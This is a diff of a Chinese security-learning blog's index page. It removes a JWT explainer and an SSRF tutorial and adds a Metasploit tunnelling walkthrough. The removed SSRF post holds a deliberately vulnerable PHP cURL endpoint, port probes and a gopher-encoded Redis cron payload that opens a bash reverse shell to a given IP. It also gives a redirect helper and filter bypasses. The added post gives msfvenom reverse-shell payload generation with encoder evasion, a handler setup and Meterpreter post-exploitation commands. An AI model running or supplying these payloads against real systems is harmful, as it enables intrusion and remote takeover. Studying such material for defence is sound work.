@@ -90,224 +90,6 @@
     
         <article class="post">
             <h1>
-                <a class="title" href="/2018/08/12/（转载） 基于 Token 的身份验证/"> 
-                    (转载)基于 Token 的身份验证 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-12   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="传统身份验证的方法"><a href="#传统身份验证的方法" class="headerlink" title="传统身份验证的方法"></a>传统身份验证的方法</h2><p>HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。</p>
-<p>解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p>
-<p>上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。</p>
-<h2 id="基于-Token-的身份验证方法"><a href="#基于-Token-的身份验证方法" class="headerlink" title="基于 Token 的身份验证方法"></a>基于 Token 的身份验证方法</h2><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
-<ul>
-<li><p>客户端使用用户名跟密码请求登录</p>
-</li>
-<li><p>服务端收到请求，去验证用户名与密码</p>
-</li>
-<li><p>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p>
-</li>
-<li><p>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p>
-</li>
-<li><p>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p>
-</li>
-<li><p>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p>
-</li>
-</ul>
-<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分：</p>
-<ul>
-<li><p>header</p>
-</li>
-<li><p>payload</p>
-</li>
-<li><p>signature</p>
-</li>
-</ul>
-<p>中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。</p>
-<p>{</p>
-<p>  “typ”: “JWT”,</p>
-<p>  “alg”: “HS256”</p>
-<p>}</p>
-<p>上面的内容要用 Base64 的形式编码一下，所以就变成这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段：</p>
-<ul>
-<li><p>iss：Issuer，发行者</p>
-</li>
-<li><p>sub：Subject，主题</p>
-</li>
-<li><p>aud：Audience，观众</p>
-</li>
-<li><p>exp：Expiration time，过期时间</p>
-</li>
-<li><p>nbf：Not before</p>
-</li>
-<li><p>iat：Issued at，发行时间</p>
-</li>
-<li><p>jti：JWT ID</p>
-</li>
-</ul>
-<p>比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。</p>
-<p>{</p>
-<p> “iss”: “ninghao.net”,</p>
-<p> “exp”: “1438955445”,</p>
-<p> “name”: “wanghao”,</p>
-<p> “admin”: true</p>
-<p>}</p>
-<p>使用 Base64 编码以后就变成了这个样子：</p>
-<p>eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ</p>
-<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>JWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。</p>
-<ul>
-<li><p>header</p>
-</li>
-<li><p>payload</p>
-</li>
-<li><p>secret</p>
-</li>
-</ul>
-<p>var encodedString = base64UrlEncode(header) + “.” + base64UrlEncode(payload);</p>
-<p>HMACSHA256(encodedString, ‘secret’);</p>
-<p>处理完成以后看起来像这样：</p>
-<p>SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<p>最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<p>客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。</p>
-<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文转载自<a href="https://ninghao.net/blog/2834" target="_blank" rel="noopener">https://ninghao.net/blog/2834</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/10/初探ssrf/"> 
-                    初探ssrf 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-10   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/">webshell</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>ssrf是很常见的一个漏洞，一开始把ssrf简单的理解为链接重定向漏洞，其实也可以这么说，曾经这个漏洞影响过许多互联网企业。</p>
-<p>危害有如下几个类型:</p>
-<p>内网端口扫描<br>内网Web应用指纹识别<br>通过访问内网Web应用robots.txt等方式辨别cms的类型及版本然后根据公开的漏洞去攻击内网服务器<br>读取本地文件<br>读取远程文件<br>攻击内网其他应用,如redis,从而反弹shell</p>
-<h2 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h2><h3 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h3><p>curl是一个利用URL语法在命令行方式下工作的文件传输工具。PHP中有cURL的苦，叫libcurl，支持许多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl同样支持HTTPS认证，HTTP POST方法, HTTP PUT方法, FTP上传, kerberos认证, HTTP上传, 代理服务器, cookies, 用户名/密码认证, 下载文件、</p>
-<p>我们可以利用curl进行抓取网页内容</p>
-<h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
-<p>类似于这样的形式：</p>
-<pre><code>ip:port/ssrf.php?url=xxxx</code></pre><p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
-<p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
-<h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
-<pre><code>&lt;?php 
-// 创建一个新cURL资源
-$ch = curl_init(); 
-
-// 设置URL和相应的选项
-curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); 
-curl_setopt($ch, CURLOPT_HEADER, 0); 
-
-// 抓取URL并把它传递给浏览器
-curl_exec($ch); 
-
-// 关闭cURL资源，并且释放系统资源
-curl_close($ch); 
-?&gt;</code></pre><h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
-<p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
-<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</code></pre><p>协议就算失效了，这种方法失败</p>
-<h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
-<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</code></pre><p>服务端会执行：</p>
-<pre><code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
-<p>探测3306端口</p>
-<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:3306
-/info</code></pre><h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
-<pre><code>redis-cli -h $1 flushall
-echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
-redis-cli -h $1 config set dir /var/spool/cron/
-redis-cli -h $1 config set dbfilename root
-redis-cli -h $1 save</code></pre><p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
-<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
-<p>代码如下：</p>
-<pre><code>function curl($url){
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
-// 限制为HTTPS、HTTP协议
-curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_exec($ch);
-curl_close($ch);
-}
-
-$url = $_GET[&#39;url&#39;];
-curl($url);
-?&gt;</code></pre><p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
-<p>302辅助跳转脚本：</p>
-<pre><code>&lt;?php  
-$schema = $_GET[&#39;schema&#39;];
-$ip     = $_GET[&#39;ip&#39;];
-$port   = $_GET[&#39;port&#39;];
-$query  = $_GET[&#39;query&#39;];
-
-echo &quot;\n&quot;;
-echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;
-
-if(empty($port)){  
-    header(&quot;Location: $schema://$ip/$query&quot;);
-} else {
-    header(&quot;Location: $schema://$ip:$port/$query&quot;);
-}</code></pre><p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
-<pre><code>http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</code></pre><p>注意是POST请求还是GET请求</p>
-<h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
-<h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
-<h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">利用 gopher 协议拓展攻击面</a></p>
-<p><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">浅析SSRF原理及利用方式</a></p>
-<p><a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/10/初探ssrf/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
                 <a class="title" href="/2018/08/08/Socket套接字编程学习/"> 
                     Socket套接字编程学习 
                 </a>
@@ -1052,6 +834,179 @@ linux因为系统安全，是不支持IP转发的，其配置文件写在/proc/s
             </div>
             <div class="continue">
             <a href="/2018/07/14/HITCON CTF命令执行绕过/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/07/09/内网穿透进行Metasploit渗透/"> 
+                    内网穿透进行Metasploit渗透 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-07-09   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="初识Metasploit"><a href="#初识Metasploit" class="headerlink" title="初识Metasploit"></a>初识Metasploit</h2><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，是一个框架，常用于内网渗透。</p>
+<p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 </p>
+<h2 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h2><h3 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h3><p>这是一个基于TCP的反向shell</p>
+<h3 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h3><p>基于http方式的反向连接，在网速慢的情况下不稳定</p>
+<h3 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h3><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p>
+<h3 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h3><p>这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p>
+<h2 id="payload选择的三大要素如下："><a href="#payload选择的三大要素如下：" class="headerlink" title="payload选择的三大要素如下："></a>payload选择的三大要素如下：</h2><ul>
+<li>木马连接的方向</li>
+<li>目标操作系统及版本</li>
+<li>反弹的shell类型</li>
+</ul>
+<p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试）</p>
+<p>操作系统位数查看：</p>
+<pre><code>getconf LONG_BIT</code></pre><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
+<pre><code>1 linux/x86/meterpreter/reverse_tcp
+2 linux/x86/meterpreter/bind_tcp
+3 linux/x86/shell_bind_tcp
+4 linux/x86/shell_reverse_tcp
+5 linux/x64/shell_reverse_tcp
+6 linux/x64/shell_bind_tcp</code></pre><p>windows相关payload:</p>
+<pre><code>1 windows/meterpreter/reverse_tcp
+2 windows/meterpreter/bind_tcp
+3 windows/shell_reverse_tcp
+4 windows/shell_bind_tcp
+5 windows/x64/meterpreter/reverse_tcp
+6 windows/x64/meterpreter/bind_tcp
+7 windows/x64/shell_reverse_tcp
+8 windows/x64/shell_bind_tcp</code></pre><p>payload具体参数含义:</p>
+<pre><code>-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)
+-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
+-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
+-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+-a, --arch       &lt;architecture&gt;  指定payload的目标架构
+    --platform   &lt;platform&gt;      指定payload的目标平台
+-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
+-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;
+-i, --iterations &lt;count&gt;         指定payload的编码次数
+-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
+-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
+-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+    --payload-options            列举payload的标准选项
+-o, --out   &lt;path&gt;               保存payload
+-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
+    --shellest                   最小化生成payload
+-h, --help                       查看帮助选项
+    --help-formats               查看msf支持的输出格式列表</code></pre><p>一个典型的msfvenom使用举例如下：</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</code></pre><h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
+<p>因为我是内网的Kali，所以要进行内网穿透：<br>内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透，就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>
+<p>首先我们为什么要内网穿透？因为我们的kali在内网，当木鸡（简称）执行我们msf生成的EXE木马时，它会把自己的Shell反弹出去，当然这个Shell不可能反弹到我们自己的内网。那么我们就需要有个外网的ip来监听这个Shell。当然，我们也可以用自己的外网ip来映射到kali上。但是一方面我觉得不安全，另一方面我觉得windows限制太多了，所以就利用我有的一台Centos7的VPS来当作这个跳板。时间不多了，开始记录一下目前的步骤：</p>
+<h2 id="获取meterpreter会话"><a href="#获取meterpreter会话" class="headerlink" title="获取meterpreter会话"></a>获取meterpreter会话</h2><h3 id="VPS开启流量转发"><a href="#VPS开启流量转发" class="headerlink" title="VPS开启流量转发"></a>VPS开启流量转发</h3><p>在网上看到有人说用lcx作为内网端口转发的工具，但是centos7好像编译环境不允许lcx，使用不起。用Ssocks搭建隧道，监听两个端口，7777用来接收来自受害者反弹的shell，7778将7777的流量转发出。下载sSocks，执行命令编译<code>./configure &amp;&amp; make</code>,进入src文件夹</p>
+<pre><code>./rcsocks -l 7777 -p 7778</code></pre><h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
+<pre><code>msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload
+msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址
+lhost =&gt; xxxxx(外网Ip) 
+msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)
+lport =&gt; 6666
+msf &gt; payload(reverse_tcp) &gt; generate -b &#39;\x00\xff&#39; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe
+[*] Writing 73802 bytes to /root/test.exe...</code></pre><h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
+<pre><code>msf &gt; payload(reverse_tcp) &gt; back</code></pre><p>运行监听模块：</p>
+<pre><code>msf &gt; use exploit/multi/handler</code></pre><p>设置接收的payload：</p>
+<pre><code>msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</code></pre><p>设置vps监听的地址和转发的端口：</p>
+<pre><code>msf exploit(handler) &gt; set rhost xxxx(外网Ip)
+rhost =&gt; xxxx(外网Ip)
+msf exploit(handler) &gt; set lport 7778
+lport =&gt; 7778
+msf exploit(handler) &gt; exploit
+[*] Started bind handler
+[*] Sending stage (957999 bytes) to xxxx(外网Ip)
+[*] Starting the payload handler...</code></pre><h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
+<pre><code>chomd +x ./shell.elf</code></pre><p>然后再运行就可以了</p>
+<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre><code>background  # 让meterpreter处于后台模式  
+sessions -i index   # 与会话进行交互，index表示第一个session  
+quit  # 退出会话  
+shell # 获得控制台权限  
+irb # 开启ruby终端</code></pre><h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre><code>cat # 查看文件内容  
+getwd # 查看当前工作目录  
+upload  # 上传文件到目标机上  
+download # 下载文件到本机上  
+edit # 编辑文件  
+search  # 搜索文件</code></pre><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre><code>ipconfig / ifconfig # 查看网络接口信息  
+portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 
+rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码
+route # 获取路由表信息</code></pre><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><pre><code>ps # 查看当前活跃进程 
+migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 
+execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 
+getpid # 获取当前进程的pid 
+kill pid # 杀死进程 
+getuid # 查看权限 
+sysinfo # 查看目标机系统信息，如机器名，操作系统等 
+shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/07/09/内网穿透进行Metasploit渗透/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/06/23/CTF中的Misc题目/"> 
+                    CTF中的Misc题目 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-06-23   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，Misc/">ctf，Misc</a></li></ul>
+            </div>
+            <div class="content">
+                
